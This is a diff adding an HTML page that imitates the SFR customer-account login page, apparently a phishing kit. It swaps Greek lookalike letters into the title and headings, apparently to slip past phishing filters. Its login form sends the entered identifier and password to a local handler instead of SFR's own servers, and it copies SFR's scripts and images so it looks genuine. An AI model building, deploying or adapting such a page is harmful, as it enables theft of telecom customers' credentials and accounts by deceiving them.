@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="refresh" content="840">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="description" content="Identifiez-vous sur votre espace client pour consulter vos consommations, vos factures et paiements, offres et options et vos avantages fidelites" />
+<meta name="robots" content="index, follow, all" />
+<title>Es&rho;ace Client SFR - Gesti&omicron;n de mon c&omicron;m&rho;te SFR</title>
+<link rel="shortcut icon" href="img/favicon.ico" />
+<script type="text/javascript" src="https://s1.s-sfr.fr/cas/js/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://s1.s-sfr.fr/cas/js/mire-v1-script.js"></script>
+<script type="text/javascript" src="https://s1.s-sfr.fr/cas/js/mire-jquery.placeholder.js"></script>
+<script type="text/javascript">
+	_stats_pagename = "Authentification/Mon Compte";
+ 	
+ 	_cCas = {
+		ts: 1404356319713,
+		img: "https://static.s-sfr.fr/media/mire_espace_client.jpg",
+		alt: "Outils de Gestion SFR mon compte",
+		focus: true,
+		css: "https://s1.s-sfr.fr/cas/css/mire-v2-style-web.css",
+		ok: 0
+	}
+ 	
+
+	$(function(){
+		var enableEtag = true;
+		var typeMire="web";
+		if (!enableEtag || !_cCas.ok) {
+			finalizeLoginPage(typeMire);
+			loadStyle();
+			if (typeMire=="web") {
+				var img = new Image();
+				img.src = "https://static.s-sfr.fr/media/mire_espace_client.jpg";
+				img.alt = "Outils de Gestion SFR mon compte";
+				$("#colL").append(img);
+			}
+		}
+		if (!enableEtag || _cCas.focus) {
+			focus();
+		}
+	});
+
+	function finalizeLoginPage(type) {
+		var enableEtag = true;
+		var cdnOption = "";
+		var mobileOption = "&mobileMode=true";
+		var layerOption = "&layerMode=true";
+		var urlRetour = "&urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check";
+	    var forgotPasswordUrl = "https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?";
+	    var forgotIdUrl = "https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?";
+	    var forgotPasswordCID = "#sfrclicid=EC_mire_oubli-mdp";
+	    var forgotPasswordLayerCID = "#sfrclicid=EC_mire_layer-mdp-oublie";
+	    var forgotIdCID = "#sfrclicid=EC_mire_oubli-id";
+	    var forgotIdLayerCID = "#sfrclicid=EC_mire_layer-oubli-id";
+	    var accountLockedCID = "#sfrclicid=EC_mire_compte-ko";
+	    var accountLockedErrorCID = "#sfrclicid=EC_mire_msgerr-compte-ko";
+	    if (type == "mobile") {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + mobileOption + urlRetour + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + mobileOption + urlRetour + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + mobileOption + urlRetour + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + mobileOption + urlRetour + accountLockedErrorCID);
+	    	$("#mire-items li").last().remove();
+	    	$("#mire-items li").last().remove();
+	    	$("#firstConnection").remove();
+	    	$("#editoTitle").remove();
+	    	$("#helpTitle").remove();
+	    	$(".style-second-block").remove();
+	    	$("#mire-phishing").remove();
+	    	$(".error-panel").detach().appendTo("#formTitle");
+	    	if (enableEtag) { _cCas.focus = false }
+	    } else if (type == "layer") {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + layerOption + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + layerOption + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + layerOption + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + layerOption + accountLockedErrorCID);
+	    	$("#forgotId").attr("href", "#");
+	    	$("#forgotIdLayerUrl").attr("href", "#").click(function(){
+	    		urlRetour = "";
+	    		window.parent.location.href = forgotIdUrl + urlRetour + forgotIdLayerCID;
+	    		return false;
+	    	});
+	    	$("input, textarea").placeholder();
+	    } else {
+	    	$("#forgotPassword").attr("href", forgotPasswordUrl + urlRetour + cdnOption + forgotPasswordCID);
+	    	$("#forgotPasswordLayer").attr("href", forgotPasswordUrl + urlRetour + cdnOption + forgotPasswordLayerCID);
+	    	$("#accountLocked").attr("href", forgotPasswordUrl + urlRetour + cdnOption + accountLockedCID);
+	    	$("#accountLockedError").attr("href", forgotPasswordUrl + urlRetour + cdnOption + accountLockedErrorCID);
+	    	$("#forgotId").attr("href", forgotIdUrl + urlRetour + forgotIdCID);
+	    	$("input, textarea").placeholder();
+	    }
+	}
+	function loadStyle(){
+		$("head").append('<link rel="stylesheet" type="text/css" href="https://s1.s-sfr.fr/cas/css/mire-v2-style-web.css" />');
+	}
+	function focus(){
+		var username = $("#username");
+		var password = $("#password");
+		if (username.attr("type") == "hidden") password.focus();
+		else username.focus();
+	}
+	function sendStats(pn) {try{stats({pn:pn})} catch(e) {}}
+	function sendStatsMsg(m) {sendStats("Authentification/Mon Compte"+m)}
+	function sendStatsHelp(m) {sendStats("Aide/Mon Compte"+m)}
+	function trackLink(l,m) {s_tl(l,'o',s.pageName+m)}
+
+</script>
+</head>
+<body class="sfr-pwp-content"  style="" >
+		<div class="page">
+		<div id="headerr" class=""><a href="#h"><img src="img/header.png" alt="" /></a></div>
+			<!-- Debut de id="main" -->
+			<div id="main">
+
+				<div class="boxTitle">
+					<h1 id="editoTitle" class="" >Espace Client SFR</h1>
+				</div>
+
+				<div id="colR">
+
+					<div id="column-right">
+
+						<div class="block" id="style-first-block">
+
+							<div class="content-area" id="mire-phishing">
+								<div class="item center">
+									<a href="#Info" class="really-light-link">Inf&omicron;	 	&Rho;hishing</a>
+								</div>
+							</div>
+
+							<h2 id="formTitle">C&omicron;nnectez-vous</h2>
+							<div class="content-area" id="mire-form">
+								<p class="notes">Email, NeufID ou num&eacute;ro de ligne m&omicron;bile/Cl&eacute; Internet</p>
+								
+								<form name="loginForm" id="loginForm" action="?clicid=29603&default=eda09abc6228e16ab13f808a11e41635" method="post">
+										<div class="custom-input-text">
+											<label for="username"></label>
+											<img class="is-focus" src="https://static.s-sfr.fr/media/icon-user-focus_20x20.png"/>
+											<img class="is-onerror" src="https://static.s-sfr.fr/media/icon-user-error_20x20.png"/>
+											<img class="is-normal" src="https://static.s-sfr.fr/media/icon-user-normal_20x20.png"/>
+											<input id="username" name="user" type="text" value="" placeholder="Identifiant" autocomplete="off" maxlength="256" />
+										</div>
+
+									<div class="custom-input-text">
+										<label for="password"></label>
+										<img class="is-focus" src="https://static.s-sfr.fr/media/icon-password-focus_20x20.png"/>
+										<img class="is-onerror" src="https://static.s-sfr.fr/media/icon-password-error_20x20.png"/>
+										<img class="is-normal" src="https://static.s-sfr.fr/media/icon-password-normal_20x20.png"/>
+										<input id="password" name="pass" type="password" value="" placeholder="Mot de passe" autocomplete="off" maxlength="16" />
+									</div>
+									<!--  -->
+																		<div class="item">
+										<div class="checkbox-left">
+											<div class="part-1">
+												<input type="checkbox" name="remember-me" id="remember-me" checked />
+											</div>
+											<div class="part-2">
+												<label for="remember-me">Rester connect&eacute;</label>
+											</div>
+										</div>
+										<button class="button-2" type="submit" name="identifier">Me connecter</button>
+									</div>
+								</form>
+								
+							</div>
+
+							<h2 id="helpTitle">Bes&omicron;in d'aide</h2>
+
+							<div class="content-area" id="mire-items">
+								
+								<ul class="items-list">
+									<li><a id="forgotPassword" href="#EC_mire_compte" class="light-link">M&omicron;t de passe oubli&eacute;</a></li>
+									<li><a id="accountLocked" href="#EC_mire_compte-ko" class="light-link">C&omicron;mpte bloqu&eacute;</a></li>
+									<li><a id="forgotId" href="#EC_mire_oubli-id" class="light-link">Identifiant oubli&eacute;</a></li>
+									<li><a id="firstConnection" href="#connexion" class="light-link">Premi&egrave;re connexion</a></li>
+								</ul>
+
+							</div>
+						</div>
+
+						<style>
+.style-second-block#block-acte-urgence-v2 {
+  background-color: #f0f0f0;
+  padding-left: 65px;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text {
+  background: #FFF;
+  padding: 12px 8px;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  height: 100%;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > h5,
+.style-second-block#block-acte-urgence-v2 .second-block-text x:-moz-any-link,
+.style-second-block#block-acte-urgence-v2 .second-block-text x:default {
+  font-family: "SFR-Regular", Arial, Sans-serif !important;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > h5 {
+  font-size: 13px;
+  /*so it can be rounded a bit more*/
+
+  font-size: 0.8125rem;
+  letter-spacing: -0.01em;
+  margin-bottom: 2px;
+  font-family: "SFR-Bold", "SFR-Regular", Arial, Sans-serif;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > a {
+  font-size: 12px;
+  /*so it can be rounded a bit more*/
+
+  font-size: 0.75rem;
+  display: block;
+  padding-left: 14px;
+  height: 32px;
+  line-height: 32px;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  color: #000;
+  text-decoration: none;
+  position: relative;
+  background-image: url(https://static.s-sfr.fr/media/sprite.png);
+  background-repeat: no-repeat;
+  background-position: 0px -1289px;
+}
+.style-second-block#block-acte-urgence-v2 .second-block-text > a:hover {
+  text-decoration: underline;
+}
+.style-second-block#block-acte-urgence-v2 {
+  background-image: url(https://static.s-sfr.fr/media/sprite.png);
+  background-repeat: no-repeat;
+  background-position: 6px -1861px;
+}
+</style>
+<div id="block-acte-urgence-v2" class="style-second-block">
+<div class="second-block-text"><h5>M&omicron;bile perdu ou vol&eacute;, SIM bl&omicron;qu&eacute;e</h5>
+<a href="#EC_mire_actes-urgences" class="really-light-link">Acc&eacute;dez aux actes d'urgence</a></div></div>
+					</div>
+				</div>
+				<div id="xcolL">
+						<img id="xeditoImage" src="img/mire_espace_client.jpg" alt="Outils de Gestion SFR mon compte" />
+				</div>
+			</div><!-- Fin de id="main" -->
+		<div id="footerr"><a href="#f"><img src="img/footer.png" alt="" /></a></div>
+	</div>
+	</body>
+</html>
